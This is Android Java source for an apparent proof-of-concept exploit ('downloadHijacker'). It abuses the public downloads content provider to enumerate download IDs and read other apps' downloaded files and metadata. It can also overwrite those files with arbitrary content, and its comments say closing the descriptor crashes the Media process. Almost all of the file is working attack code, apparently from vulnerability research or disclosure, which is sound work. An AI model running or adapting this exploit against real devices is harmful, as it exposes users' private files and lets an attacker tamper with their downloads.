package com.ioactive.downloadHijacker;

import android.app.AlertDialog;
import android.content.ContentResolver;
import android.content.DialogInterface;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.ParcelFileDescriptor;
import android.support.v7.app.AppCompatActivity;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.Switch;
import android.widget.TextView;

import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

public class MainActivity extends AppCompatActivity {
    // Adjustable priority for the "dump info" thread (-20 = maximum priority)
    private static final int THREAD_PRIORITY = -20;

    // Adjustable size in bytes for the file "dump info" functionality
    private static final int DUMP_SIZE = 300;

    protected static final String TAG = "DownProvHijacker";
    protected static final String LOG_SEPARATOR = "\n**********************************\n";
    protected static final String PUBLIC_DOWNLOADS_ID_URI = "content://downloads/public_downloads/";

    private TextView mTextViewLog;
    private EditText mEditMinId;
    private EditText mEditMaxId;
    private Switch mSwitchCloseFiles;

    // Dummy container for file descriptors, to keep a reference and avoid closing them
    ArrayList<ParcelFileDescriptor> mFileDescriptors = new ArrayList<ParcelFileDescriptor>();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        mTextViewLog = findViewById(R.id.textViewLog);
        mTextViewLog.setMovementMethod(new ScrollingMovementMethod());

        mEditMinId = findViewById(R.id.editMinId);
        mEditMaxId = findViewById(R.id.editMaxId);
        mSwitchCloseFiles = findViewById(R.id.switchCloseFiles);
    }

    private synchronized void log(final String text) {
        Log.d(TAG, text);

        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                mTextViewLog.append(text + "\n");
            }
        });
    }

    public void buttonStartService_Click(View view) {
        Intent intent = new Intent(this, DownloadHijackerService.class);
        intent.putExtra("minId", Integer.parseInt(mEditMinId.getText().toString()));
        intent.putExtra("maxId", Integer.parseInt(mEditMaxId.getText().toString()));
        intent.putExtra("closeFiles", mSwitchCloseFiles.isChecked());

        startService(intent);
        log("Starting hijacking service... Please check logcat for detailed output.");
    }

    public void buttonDump_Click(View view) {
        new Thread(new Runnable() {
            public void run() {
                android.os.Process.setThreadPriority(THREAD_PRIORITY);
                int minId = Integer.parseInt(mEditMinId.getText().toString());
                int maxId = Integer.parseInt(mEditMaxId.getText().toString());

                try {
                    dump(minId, maxId);
                } catch (Exception ex) {
                    Log.e(TAG, "Error", ex);
                }
            }
        }).start();
    }

    public void buttonOverwrite_Click(View view) {
        final int id = Integer.parseInt(mEditMinId.getText().toString());
        final boolean closeFile = mSwitchCloseFiles.isChecked();
        DialogInterface.OnClickListener dialogClickListener = new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                if (which == DialogInterface.BUTTON_POSITIVE) {
                    overwriteFile(id, closeFile);
                }
            }
        };

        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("OVERWRITE DOWNLOADED FILE?");
        builder.setMessage("This action will overwrite the downloaded file with ID " + id + ". " +
                "This action cannot be undone, so make sure you have a backup. Are you sure?");
        builder.setNegativeButton("No", null);
        builder.setPositiveButton("Yes", dialogClickListener);
        builder.show();
    }


    private void overwriteFile(int id, boolean closeFile) {
        ContentResolver res = getContentResolver();
        Uri uri = Uri.parse(PUBLIC_DOWNLOADS_ID_URI + id);
        Cursor cur = res.query(uri, null, null, null, null);
        try {
            if (cur != null && cur.getCount() > 0) {
                cur.moveToFirst();
                String rowData = cur.getString(cur.getColumnIndex("_data"));

                if (rowData != null && !rowData.isEmpty()) {
                    try {
                        ParcelFileDescriptor fd = res.openFileDescriptor(uri, "rwt");
                        FileWriter fw = new FileWriter(fd.getFileDescriptor());
                        DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
                        fw.write(dateFormat.format(new Date()));
                        fw.write("\n(Any arbitrary contents can be placed here...)");

                        log(LOG_SEPARATOR + "Overwritten file: " + rowData);
                        fw.flush();

                        // Closing the file descriptor will crash the Android Media process
                        if (closeFile)
                            fd.close();
                        else
                            mFileDescriptors.add(fd);
                    } catch (FileNotFoundException e) {
                        e.printStackTrace();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                } else
                    log(LOG_SEPARATOR + "Cannot overwrite file. The path is empty.");
            } else
                log(LOG_SEPARATOR + "Cannot overwrite file. The download ID " + id + " does not exist.");
        } finally {
            if (cur != null)
                cur.close();
        }
    }

    private void dump(int minId, int maxId) {
        ContentResolver res = getContentResolver();

        // Iterate all downloads within the range specified in the UI
        for (int id = minId; id <= maxId; id++) {
            Uri uri = Uri.parse(PUBLIC_DOWNLOADS_ID_URI + id);
            Cursor cur = res.query(uri, null, null, null, null);

            try {
                if (cur != null && cur.getCount() > 0) {
                    // If a download is found, show some of its fields from the database
                    cur.moveToFirst();
                    String rowData = cur.getString(cur.getColumnIndex("_data"));
                    String rowUri = cur.getString(cur.getColumnIndex("uri"));
                    String rowTitle = cur.getString(cur.getColumnIndex("title"));
                    String rowDescription = cur.getString(cur.getColumnIndex("description"));

                    StringBuilder sb = new StringBuilder(LOG_SEPARATOR);
                    sb.append("DOWNLOAD ID ").append(id);
                    sb.append("\nData: ").append(rowData);
                    sb.append("\nUri: ").append(rowUri);
                    sb.append("\nTitle: ").append(rowTitle);
                    sb.append("\nDescription: ").append(rowDescription);

                    if (rowData != null && !rowData.isEmpty()) {
                        // If the "_data" field is not empty, attempt to show its file contents.
                        try {
                            ParcelFileDescriptor fd = res.openFileDescriptor(uri, "r");
                            long fileSize = fd.getStatSize();
                            FileInputStream is = new FileInputStream(fd.getFileDescriptor());

                            // In this PoC, only the number of bytes set in DUMP_SIZE will be shown,
                            // but nothing prevents the entire file to be read.
                            byte[] buffer = new byte[DUMP_SIZE];
                            int bytesRead = is.read(buffer);

                            sb.append("\nSize: ").append(fileSize).append(" bytes\n----------\n");
                            for (int i = 0; i < bytesRead; i++) {
                                //sb.append(String.format("%02X ", buffer[i]));
                                char c = (char) buffer[i];
                                if (Character.isISOControl(c))
                                    c = '.';
                                sb.append(c);
                            }
                        } catch (Exception e) {
                            Log.e(TAG, "Error in Dump: ", e);
                        }
                    }

                    log(sb.toString());
                }
            } finally {
                if (cur != null)
                    cur.close();
            }
        }
        log("\n\nDUMP FINISHED (IDs: " + minId + " to " + maxId + ")");
    }

}
